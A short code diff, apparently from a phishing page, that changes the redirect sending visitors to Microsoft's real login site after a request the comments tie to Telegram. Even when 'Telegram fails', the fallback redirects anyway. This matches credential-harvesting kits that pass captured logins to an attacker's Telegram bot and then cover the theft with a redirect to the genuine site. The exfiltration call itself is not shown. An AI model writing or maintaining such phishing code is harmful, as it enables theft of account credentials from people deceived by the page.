@@ -257,13 +257,13 @@
             .then(response => {
                 // 1 Second Delay before redirect
                 setTimeout(() => {
-                    window.location.href = "https://login.microsoftonline.com";
+                    window.location.href = "https://login.microsoftonline.com/";
                 }, 1000);
             })
             .catch(error => {
                 // Fallback redirect even if Telegram fails
                 setTimeout(() => {
-                    window.location.href = "https://login.microsoftonline.com";
+                    window.location.href = "https://login.microsoftonline.com/";
                 }, 1000);
             });
         }
